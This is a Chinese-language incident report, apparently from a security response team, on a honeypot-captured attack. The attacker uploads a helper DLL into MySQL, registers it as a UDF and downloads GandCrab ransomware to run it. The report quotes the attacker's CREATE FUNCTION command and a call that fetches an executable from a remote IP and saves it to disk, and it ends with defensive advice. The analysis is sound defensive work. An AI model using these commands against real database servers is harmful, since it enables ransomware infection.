事件来源

近日，HSCERT监测发现，一台蜜罐机器上监控到了可疑网络流量，蜜罐捕获了Windows样本文件。

攻击者首先使用SQL数据库命令将一个DLL上传到服务器，然后将该DLL作为数据库函数调用，检索IP地址上托管的GandCrab恶意软件。

样本分析

SQL攻击

攻击的第一阶段涉及攻击者连接到数据库服务器并确定它正在运行MySQL。蜜罐模拟了MySQL，因此他的攻击相对顺利。



接下来，攻击者使用“set”命令将构成DLL的所有字节（以长十六进制字符串的形式）上传到变量的内存中。



然后攻击者将该变量的内容写入它创建的数据库表，名为yongger2。

然后，攻击者向服务器发出命令，将这些字节连接成一个文件，然后将它们放入服务器的插件目录中。还观察到几个用于交换正斜杠和反斜杠字符的命令，这些命令似乎旨在使安全功能最终运行。

Helper DLL的内部功能：



DLL似乎向数据库添加了三个函数，名为xpdl3，xpdl3_deinit和xpdl3_init， 并且已被确认是许多恶意工具包中的组件文件，这些工具包先前已上载到VirusTotal等服务。

DLL包含在许多VirusTotal的恶意工具包存档中：


攻击者发出SQL命令以删除yongger2表，通过服务器删除文件轨迹的记录，并删除名为xpdl3的函数（如果已存在）。最后，它使用以下SQL命令创建一个调用DLL的新数据库函数（也称为xpdl3）：


CREATE FUNCTION xpdl3 RETURNS STRING SONAME 'cna12.dll'


将Helper DLL上传到数据库服务器的插件目录并对其进行初始化后，攻击者将此SQL命令发送到服务器，调用新添加的xpdl3函数：


select xpdl3('hxxp://172.96.14.134:5471/3306-1[.]exe','c:\\isetup.exe')


如果一切正常（在这种情况下确实如此），数据库服务器从远程计算机下载GandCrab恶意程序并将其命名为isetup.exe，放在的C：驱动器的根目录中并执行它。


攻击频率

这个特殊的攻击在5月19日星期日当地时间中午左右发生了几秒钟。如果针对实际的MySQL服务器发生此攻击，那么该机器现在将被加密，并且该服务器的所有者将遇到麻烦。



但是文件来源的URL受到了严格的审查。它指向运行服务器软件的Web服务器上的一个打开目录，名为HFS，它是一个基于Windows的Web服务器，采用单个应用程序的形式。

 

令人感兴趣的是，托管GandCrab的这台机器的IP地址在美国沙漠西南地区的亚利桑那州地理位置，并且该机器上的HFS安装的用户界面是简体中文。另一件有趣的事情是，它显示了有人下载了此服务器上托管的任何文件的次数。

打开的目录显示了五个名称以“3306”开头的Windows可执行文件 - 文件名中带有连字符的所有文件实际上都是同一文件的重命名版本。只有名为“3306.exe”的文件与其他文件不同。（使用3306作为文件名可能并非巧合。）该目录还包含一个名为RDP的恶意Linux ELF可执行文件，该文件未在此攻击中使用。



服务器似乎表明我看到MySQL蜜罐下载（3306-1.exe）的样本下载超过500次。但是，名为3306-2.exe，3306-3.exe和3306-4.exe的示例与该文件相同。一起计算，自从他们被放置在这台服务器上之后的五天内已经有近800次下载，以及在开放目录中超过2300次下载其他（大约一周大）的GandCrab样本。

 

因此，虽然这不是特别大规模或广泛的攻击，但它确实给MySQL服务器管理员带来了严重的风险，他们通过防火墙为数据库服务器上的端口3306挖了一个洞，以便外部世界可以访问。


 病毒防护

1、尽量关闭不必要的端口，如：445、135，139等，对3389，5900等端口可进行白名单配置，只允许白名单内的IP连接登陆。
2、尽量关闭不必要的文件共享，如有需要，请使用ACL和强密码保护来限制访问权限，禁用对共享文件夹的匿名访问。
3、采用高强度的密码，避免使用弱口令密码，并定期更换密码。建议服务器密码使用高强度且无规律密码，并且强制要求每个服务器使用不同密码管理。
4、对没有互联需求的服务器/工作站内部访问设置相应控制，避免可连外网服务器被攻击后作为跳板进一步攻击其他服务器。
5、对重要文件和数据（数据库等数据）进行定期非本地备份。

6、及时更新软件，安装补丁。

7、请勿随意打开陌生邮件。
